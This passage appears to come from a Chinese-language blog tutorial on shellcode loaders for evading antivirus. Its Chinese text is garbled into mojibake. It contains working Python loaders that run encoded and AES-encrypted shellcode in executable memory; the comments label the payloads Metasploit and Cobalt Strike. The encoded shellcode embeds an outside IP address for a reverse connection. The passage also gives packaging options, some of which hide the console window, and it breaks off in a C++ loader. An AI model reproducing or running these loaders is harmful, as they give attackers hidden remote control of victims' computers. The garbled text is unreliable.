x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x29\x0d\x0a\x00\xc6\x24\x6a\xc0\x95\x01\xb9\x1d\x74\x0d\xbf\x57\x5c\x3d\x4a\x7f\x60\xa3\x07\xe6\x08\xb1\x97\x28\xfb\xad\x21\x89\xc1\xd0\x3a\x97\xa6\x22\x1f\xfc\xf2\x84\xa4\x04\x48\x4d\xc3\x69\x8a\x56\xbf\xd8\x30\x44\x11\x09\x9d\xfe\xdb\x1b\x35\xfe\xd7\x4d\x11\x49\x87\x3b\x4d\xaa\x39\x95\x1c\x82\xd3\xf7\x21\xf3\xb6\x46\x0d\x3b\x7d\x66\x84\x3a\xba\xc0\xc7\x42\x21\x27\x69\x3b\xca\x10\x56\xb6\xfa\xe2\xec\x57\xd0\x7f\xbc\xa5\x7d\x30\xd8\x1c\x7e\x53\xc1\xf7\x5b\xd9\xce\x24\x21\x4a\x55\x03\x88\x0e\x72\x80\x51\x5a\x92\x37\x69\x22\xf4\x72\x5e\x9a\x97\xdf\x9c\x28\xa4\x6e\x52\x50\x94\x89\xa3\x74\x69\x4e\x7f\xa5\xd0\x6c\x59\x72\x13\xb5\xf4\xde\x21\x53\x1b\x9f\x52\x83\x86\x76\x93\x9c\x21\xec\xd5\x9c\x31\x17\x60\x03\x27\x71\xc2\x46\xea\xa4\x16\xda\xe3\x6e\x11\xef\x21\x28\xb7\xe8\x5f\x63\x1b\x34\xd9\xf6\xe4\xf6\x2a\x3b\xf6\x00\xda\x13\x93\x88\x00\x41\xbe\xf0\xb5\xa2\x56\xff\xd5\x48\x31\xc9\xba\x00\x00\x40\x00\x41\xb8\x00\x10\x00\x00\x41\xb9\x40\x00\x00\x00\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x93\x53\x53\x48\x89\xe7\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="comment"># print(base64.b64encode(buf))</span></span><br><span class="line">buf=<span class="string">b&#x27;/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuGARAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L0pPeEwAA4sClK0mPuHhpEjiwPFbEBd1CT89+tD5wnACs+t8LXD7NJ4OPkfNHcNMDDOLzntbKttAvJtee5pTiH6T8L5s3hEpLa6OojnlTwBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IEJPSUU5O0VOVVMpDQoAxiRqwJUBuR10Db9XXD1Kf2CjB+YIsZco+60hicHQOpemIh/88oSkBEhNw2mKVr/YMEQRCZ3+2xs1/tdNEUmHO02qOZUcgtP3IfO2Rg07fWaEOrrAx0IhJ2k7yhBWtvri7FfQf7ylfTDYHH5Twfdb2c4kIUpVA4gOcoBRWpI3aSL0cl6al9+cKKRuUlCUiaN0aU5/pdBsWXITtfTeIVMbn1KDhnaTnCHs1ZwxF2ADJ3HCRuqkFtrjbhHvISi36F9jGzTZ9uT2Kjv2ANoTk4gAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQzLjEzOC4yNy4xMgBJlgLS&#x27;</span></span><br><span class="line">buf=base64.b64decode(buf)</span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># è®¾ç½®VirtualAllocè¿”å›ç±»å‹ä¸ºctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># ç”³è¯·å†…å­˜</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># æ”¾å…¥shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ä»shellcodeæ”¾ç½®ä½ç½®é¦–åœ°å€å¼€å§‹æ‰§è¡Œ</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># ç­‰å¾…ä¸Šé¢åˆ›å»ºçš„çº¿ç¨‹è¿è¡Œå®Œ</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h4 id="AESæ··æ·†"><a href="#AESæ··æ·†" class="headerlink" title="AESæ··æ·†"></a>AESæ··æ·†</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> ctypes,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¦‚æœtextä¸è¶³16ä½çš„å€æ•°å°±ç”¨ç©ºæ ¼è¡¥è¶³ä¸º16ä½</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_16</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># è§£å¯†åï¼Œå»æ‰è¡¥è¶³çš„ç©ºæ ¼ç”¨strip() å»æ‰</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = <span class="string">b&#x27;qqqqqqqqqqqqqqqq&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    shellcode=<span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhixing</span>(<span class="params">shellcode</span>):</span><br><span class="line">    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#msf</span></span><br><span class="line">    <span class="comment">#e=&#x27;b1f1a80ed13fac07e7f7d839e53a058e16908aa591d2b376bb04ebcccbd18f2005d456c578ce31065a5ae16e6823cfdc5b99f3d9f61eed342cf34c85a87201a29e2f6e119da6f7636c3aec6b9272cfd5e6e1882f554dbf3739f74e4df7a2f18823da1902a0424b86da0d65d10cda498e0169b3bcd73db537336df9d18ba0cc1c4e9550563c7e4f29dcfe0ddc104a172a25654dd3b75b8d8fdeba401eff9f783ba7c0b67dc79c6d7f5d8ab6dc7ce0fe3c2f65c82744b70a25d718a0f13cf031e54a30064b8f7ad4e1cff48a95af9701098a37dcd1897b54ce68a89d28bd6bd19ce792dc3625b373c34e60ed29d780f59f162fd86dc7b1c02045cf63de0a3a34af04209020efadf399d97ddc89e59a1c57ba756b589b5dc807c87d8be291917891a5bd14a6ea5fceb3163629978f067a4d9f6c223dcf29f2ce0c5af94b7f6b7b0ec93dd96bf92b316816016cabeb86a14e747db773e3cd623552237f0be1b05b9d5a7a200d18281c872b3da5cd941f633b21ff30625373f52f215e6adbaff429a51a451ce0ca1134314b24f57229465b20d1fd2e13a86480651f17939aeb78065d4a64c9f22c0263b636a2fefdacf1d62984db64d02732b71b0368042bf42d2f2c72a25c533c95eec1ede2d950e426c1e6ab007ae425f654bdabc1b2198fcf589affe811e6000cd8f05c40631e045efdc42c5bf0217e669af2ad42a9f879ba5b5aa9cb562d59458ce7bc775153d456e453fc3b95a8f2d32d280e3dd58445209f28c860c80235a039b1f49ff1d4b673d19c8a6181b7b4ab21b512e036df1faae4c1e5a15ff6554fe2d866622e62fac943b6a84a8f5eed44892598aa46973b8ed41fb7e453e979766462760a8dc915710beb422e39124d1de7dc6b4c4bc58bd95613&#x27;</span></span><br><span class="line">    <span class="comment">#cs</span></span><br><span class="line">    e=<span class="string">&#x27;0e0d6b374430510532fb94ec3f9e3e933e26c58c784e26a7a50308a6cb9286b75810a376913a4d162ce26bf16c27d8924223ea45360e595f28130c67ef3e51c6f1b21d375aaa1b97e74bab97c9b87f80842cf3597d9b5cfbe361c30c54cce15aa6fafc88fd015f303c60a96900736b35f9d8aa9f0b8f1f89133d959a633e471a6b8aa5004d271541075a6bff3dcea93036aa3ebb4621eec32350be5b73e2aa90370b97c1544258f017466e8235f03b17b282ecbd6845340ca1f87e6f58a844974aa52f1544f92df67cc29046a14c0f6528c1b20e8f82e81ff182dba4d6320082ca98bb13d28ddc7304198039b87560a12054769073faa0bb0f07ac4b12cb19c48c7d3c002d19e5e6d439f1c822e7a6fbcef094f6840aec0672d8b2b669a0fed0bbe954260658ce63e4c75e307d47528fae505ee795a14a2f0e51812119e5480a6ee0b267be2df03994c8564aac446538a6fa2d65912ee020d783603ba3fb7bb5653994418cbe6d9a30c2730c043876d5713423d60d622fbfa418f25d28f3c6599df2d4458be05e1bfbd60abc3ef71cd64812681308f73920ef7fab1318758e8a940ba7eafa3599971b841069b67ef10b88ba58b9ad13ac676700394ec521eb040acd080f491903baa8352f8db8114ea920690978aea20c30855b786124f3d27b90155ee3533ee3620a5f48d26e38b60d786d2e7ff41a07fcc9c1e0abbacfce32b5765901b576fe110bed31374b8de6c4db5316c57dda772fe5b1736b5314e2a3b8b1d665e272024dfd433b0dbd0fef3981f5087866bba50a686575e2b0f26903a54172826e0bb3713cf85b29e227c69fb6f31ca2d462decc5e3213fbb472bbd91a47316ce02b7a99122543b7db75de61e5a34944f10c08dd5ecac8f3b7e28bbe24f2cb3ef6258ef404ab222b9f128acdeec3e8dd123273fb0db73f66fe6e06e6276e3294bac412689da195e240c37b0d7803ceab2deee1a4902ef3b85a1d81a5128591a31d7b12f1773c54fbd56ebdee86f19d0cd100dd83964c8525e2f3af81c4d19603483af04b8d2d21b026ae2af9edc293c66ee40d6be7ffa35b5b0e8e5ece4f9b15097ab1471b3fa5cc8d6ee1431a8a32562641e36fc5b44c422e25482ca319882691150f8713cd8d90ed3eacec170039923a8c4b70d64773260a30d23526356c31a40675b54d6546b1c84ae338f6173eeacb03a892331dc5e9cbf0b78a2bb5ceb434d7d72441565620a9c4ab156030f35ede7dad650483cbdf8e91d64250c6dbefe3ffeaa3ea77f82f270b48a232d35fb66db49aae980180625387a8bf317beed2f612c546f015864578629c020c8f2fca445bd03c74bf7bb882d051a9b8c55ce2cc73948ad171d3a802f8bbe1b542fc36b26171d2d02e2c4cd56e2bad9983145c7011d00e5cc77967b5b980ccb9b4fd6f28efcc8538cc62d5f9ddf9e67609ce9de733109f4c8ccfbfd705d068f2e09618838270591553d662713754382047a2f8dd65e6850db61bc4ad61606e&#x27;</span></span><br><span class="line">    d = decrypt(e)  <span class="comment"># è§£å¯†</span></span><br><span class="line">    d=base64.b64decode(d)</span><br><span class="line">    zhixing(d)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Python-æ‰“åŒ…å™¨é€‰æ‹©-Pyinstall-Py2exe-Nuitka"><a href="#Python-æ‰“åŒ…å™¨é€‰æ‹©-Pyinstall-Py2exe-Nuitka" class="headerlink" title="#Python-æ‰“åŒ…å™¨é€‰æ‹©-Pyinstall&amp;Py2exe&amp;Nuitka"></a>#Python-æ‰“åŒ…å™¨é€‰æ‹©-Pyinstall&amp;Py2exe&amp;Nuitka</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>ã€pyinstaller</span><br><span class="line">-F, â€“onefile æ‰“åŒ…ä¸€ä¸ªå•ä¸ªæ–‡ä»¶ï¼Œå¦‚æœä½ çš„ä»£ç éƒ½å†™åœ¨ä¸€ä¸ª.pyæ–‡ä»¶çš„è¯ï¼Œå¯ä»¥ç”¨è¿™ä¸ªï¼Œå¦‚æœæ˜¯å¤šä¸ª.pyæ–‡ä»¶å°±åˆ«ç”¨</span><br><span class="line">-D, â€“onedir æ‰“åŒ…å¤šä¸ªæ–‡ä»¶ï¼Œåœ¨distä¸­ç”Ÿæˆå¾ˆå¤šä¾èµ–æ–‡ä»¶ï¼Œé€‚åˆä»¥æ¡†æ¶å½¢å¼ç¼–å†™å·¥å…·ä»£ç ï¼Œæˆ‘ä¸ªäººæ¯”è¾ƒæ¨èè¿™æ ·ï¼Œä»£ç æ˜“äºç»´æŠ¤</span><br><span class="line">-K, â€“tk åœ¨éƒ¨ç½²æ—¶åŒ…å« TCL/TK</span><br><span class="line">-a, â€“<span class="built_in">ascii</span> ä¸åŒ…å«ç¼–ç .åœ¨æ”¯æŒUnicodeçš„pythonç‰ˆæœ¬ä¸Šé»˜è®¤åŒ…å«æ‰€æœ‰çš„ç¼–ç .</span><br><span class="line">-d, â€“debug äº§ç”Ÿdebugç‰ˆæœ¬çš„å¯æ‰§è¡Œæ–‡ä»¶</span><br><span class="line">-w,â€“windowed,â€“noconsole ä½¿ç”¨Windowså­ç³»ç»Ÿæ‰§è¡Œ.å½“ç¨‹åºå¯åŠ¨çš„æ—¶å€™ä¸ä¼šæ‰“å¼€å‘½ä»¤è¡Œ(åªå¯¹Windowsæœ‰æ•ˆ)</span><br><span class="line">-c,â€“nowindowed,â€“console ä½¿ç”¨æ§åˆ¶å°å­ç³»ç»Ÿæ‰§è¡Œ(é»˜è®¤)(åªå¯¹Windowsæœ‰æ•ˆ)</span><br><span class="line">ä½¿ç”¨ï¼špyinstaller -F test.py</span><br></pre></td></tr></table></figure><h4 id="py2exe"><a href="#py2exe" class="headerlink" title="py2exe"></a>py2exe</h4><p>å‚è€ƒï¼š<a href="https://hoxis.github.io/python-py2exe.html">https://hoxis.github.io/python-py2exe.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">å®‰è£…ï¼špip install py2exe</span><br><span class="line">æ‰“åŒ…ï¼špython setup.py py2exe</span><br><span class="line">ä»£ç ï¼š</span><br><span class="line">setup.py</span><br><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> py2exe</span><br><span class="line">INCLUDES = [<span class="string">&#x27;108-pickle-release&#x27;</span>] <span class="comment">#æ³¨æ„ä¿®æ”¹è„šæœ¬é¡¹ç›®å</span></span><br><span class="line"> </span><br><span class="line">options = &#123;</span><br><span class="line">    <span class="string">&quot;py2exe&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;compressed&quot;</span>: <span class="number">1</span>,  <span class="comment"># 0æˆ–1,1å‹ç¼©ï¼Œ0ä¸å‹ç¼©</span></span><br><span class="line">            <span class="string">&quot;optimize&quot;</span>: <span class="number">2</span>,  <span class="comment"># 0ã€1ã€2ï¼Œæ–‡ä»¶çš„ä¼˜åŒ–çº§åˆ«</span></span><br><span class="line">            <span class="string">&quot;bundle_files&quot;</span>: <span class="number">1</span>,  <span class="comment"># 1ã€2ã€3,1è¡¨ç¤ºæ‰€æœ‰æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªexeæ–‡ä»¶ï¼Œ2è¡¨ç¤ºé™¤äº†Pythonçš„è§£é‡Šå™¨å¤–éƒ½ç»‘å®šï¼Œ3è¡¨ç¤ºä¸ç»‘å®š</span></span><br><span class="line">            <span class="string">&quot;includes&quot;</span>: INCLUDES,  <span class="comment"># åˆ—è¡¨ï¼ŒåŒ…å«å…¶å®ƒçš„ä¸€äº›æ¨¡å—</span></span><br><span class="line">            <span class="string">&quot;dll_excludes&quot;</span>: [<span class="string">&#x27;MSVCP90.dll&#x27;</span>]  <span class="comment"># åˆ—è¡¨ï¼ŒåŒ…å«çš„dllæ–‡ä»¶ä¸ä¼šæ‰“åŒ…è¿›exeç¨‹åº</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">setup(</span><br><span class="line">    version=<span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    options=options,</span><br><span class="line">    description=<span class="string">&quot;this is a xiaodi test&quot;</span>,</span><br><span class="line">    zipfile=<span class="literal">None</span>,  <span class="comment"># å…¬ç”¨æ–‡ä»¶çš„å‹ç¼©æ–‡ä»¶åç§°ï¼Œé»˜è®¤ä¸ºâ€œlibrary.zipâ€ï¼›å¦‚æœæ²¡æœ‰ï¼Œåˆ™ä¼šå°†è¿™äº›æ–‡ä»¶æ”¾åœ¨æœ€ç»ˆçš„exeæ–‡ä»¶ä¸­</span></span><br><span class="line">    console=[&#123;<span class="string">&quot;script&quot;</span>: <span class="string">&#x27;108-pickle-release.py&#x27;</span>&#125;]  <span class="comment"># ç”Ÿæˆä¸€ä¸ªæ§åˆ¶å°å½¢å¼çš„exeç¨‹åºï¼Œå¯¹åº”çš„æœ‰windows=[]ï¼Œç”ŸæˆGUIå½¢å¼çš„exeç¨‹åº</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Nuitka"><a href="#Nuitka" class="headerlink" title="Nuitka"></a>Nuitka</h4><p>å‚è€ƒ:<a href="https://jiesonshan.github.io/2020/05/27/Nuitka%E6%89%93%E5%8C%85python%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jiesonshan.github.io/2020/05/27/Nuitka%E6%89%93%E5%8C%85python%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p><p><a href="https://juejin.cn/post/7109310663851245605">https://juejin.cn/post/7109310663851245605</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">--standaloneï¼šæ–¹ä¾¿ç§»æ¤åˆ°å…¶ä»–æœºå™¨ï¼Œä¸ç”¨å†å®‰è£…python</span><br><span class="line">--show-memory --show-progressï¼šå±•ç¤ºæ•´ä¸ªå®‰è£…çš„è¿›åº¦è¿‡ç¨‹</span><br><span class="line">--nofollow-importsï¼šä¸ç¼–è¯‘ä»£ç ä¸­æ‰€æœ‰çš„<span class="keyword">import</span></span><br><span class="line">--follow-<span class="keyword">import</span>-to=utils,srcï¼šéœ€è¦ç¼–è¯‘æˆC++ä»£ç çš„æŒ‡å®šçš„<span class="number">2</span>ä¸ªåŒ…å«æºç çš„æ–‡ä»¶å¤¹ï¼Œè¿™é‡Œç”¨,æ¥è¿›è¡Œåˆ†éš”ã€‚</span><br><span class="line">--output-<span class="built_in">dir</span>=outï¼šæŒ‡å®šè¾“å‡ºçš„ç»“æœè·¯å¾„ä¸ºoutã€‚</span><br><span class="line">--windows-disable-consoleï¼šè¿è¡Œexeå–æ¶ˆå¼¹æ¡†ã€‚</span><br><span class="line">--mingw64 <span class="comment">#é»˜è®¤ä¸ºå·²ç»å®‰è£…çš„vs2017å»ç¼–è¯‘ï¼Œå¦åˆ™å°±æŒ‰æŒ‡å®šçš„æ¯”å¦‚mingw(å®˜æ–¹å»ºè®®)</span></span><br><span class="line">--standalone ç‹¬ç«‹ç¯å¢ƒï¼Œè¿™æ˜¯å¿…é¡»çš„(å¦åˆ™æ‹·ç»™åˆ«äººæ— æ³•ä½¿ç”¨)</span><br><span class="line">--windows-disable-console æ²¡æœ‰CMDæ§åˆ¶çª—å£</span><br><span class="line">--output-<span class="built_in">dir</span>=out ç”Ÿæˆexeåˆ°outæ–‡ä»¶å¤¹ä¸‹é¢å»</span><br><span class="line">--show-progress æ˜¾ç¤ºç¼–è¯‘çš„è¿›åº¦ï¼Œå¾ˆç›´è§‚</span><br><span class="line">--show-memory æ˜¾ç¤ºå†…å­˜çš„å ç”¨</span><br><span class="line">--include-qt-plugins=sensible,styles æ‰“åŒ…åPyQtçš„æ ·å¼å°±ä¸ä¼šå˜äº†</span><br><span class="line">--plugin-enable=qt-plugins éœ€è¦åŠ è½½çš„PyQtæ’ä»¶</span><br><span class="line">--plugin-enable=tk-inter æ‰“åŒ…tkinteræ¨¡å—çš„åˆšéœ€</span><br><span class="line">--plugin-enable=numpy æ‰“åŒ…numpy,pandas,matplotlibæ¨¡å—çš„åˆšéœ€</span><br><span class="line">--plugin-enable=torch æ‰“åŒ…pytorchçš„åˆšéœ€</span><br><span class="line">--plugin-enable=tensorflow æ‰“åŒ…tensorflowçš„åˆšéœ€</span><br><span class="line">--windows-icon-<span class="keyword">from</span>-ico=ä½ çš„.ico è½¯ä»¶çš„å›¾æ ‡</span><br><span class="line">--windows-company-name=Windowsä¸‹è½¯ä»¶å…¬å¸ä¿¡æ¯</span><br><span class="line">--windows-product-name=Windowsä¸‹è½¯ä»¶åç§°</span><br><span class="line">--windows-file-version=Windowsä¸‹è½¯ä»¶çš„ä¿¡æ¯</span><br><span class="line">--windows-product-version=Windowsä¸‹è½¯ä»¶çš„äº§å“ä¿¡æ¯</span><br><span class="line">--windows-file-description=Windowsä¸‹è½¯ä»¶çš„ä½œç”¨æè¿°</span><br><span class="line">--windows-uac-admin=Windowsä¸‹ç”¨æˆ·å¯ä»¥ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ¥å®‰è£…</span><br><span class="line">--linux-onefile-icon=Linuxä¸‹çš„å›¾æ ‡ä½ç½®</span><br><span class="line">--onefile åƒpyinstallerä¸€æ ·æ‰“åŒ…æˆå•ä¸ªexeæ–‡ä»¶</span><br><span class="line">--include-package=å¤åˆ¶æ¯”å¦‚numpy,PyQt5 è¿™äº›å¸¦æ–‡ä»¶å¤¹çš„å«åŒ…æˆ–è€…è½®å­</span><br><span class="line">--include-module=å¤åˆ¶æ¯”å¦‚when.py è¿™äº›ä»¥.pyç»“å°¾çš„å«æ¨¡å—</span><br><span class="line">ä½¿ç”¨ï¼šnuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-<span class="keyword">import</span>-to=utils,src --output-<span class="built_in">dir</span>=out <span class="number">108.</span>py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="C-åŠ è½½å™¨"><a href="#C-åŠ è½½å™¨" class="headerlink" title="C++åŠ è½½å™¨"></a>C++åŠ è½½å™¨</h3><p>å¯¹äºC&#x2F;C++æ¥è¯´ï¼Œå¸¸ç”¨çš„åŠ è½½æ–¹å¼æœ‰<strong>å‡½æ•°æŒ‡é’ˆæ‰§è¡Œã€å†…è”æ±‡ç¼–æŒ‡ä»¤ã€ä¼ªæŒ‡ä»¤ç­‰æ–¹å¼</strong>.</p><h4 id="å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ"><a href="#å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ" class="headerlink" title="å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ"></a>å‡½æ•°æŒ‡é’ˆæ‰§è¡Œ</h4><p>ç®€å•çš„Cä»£ç :</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    (*(<span class="built_in">void</span>(*)() 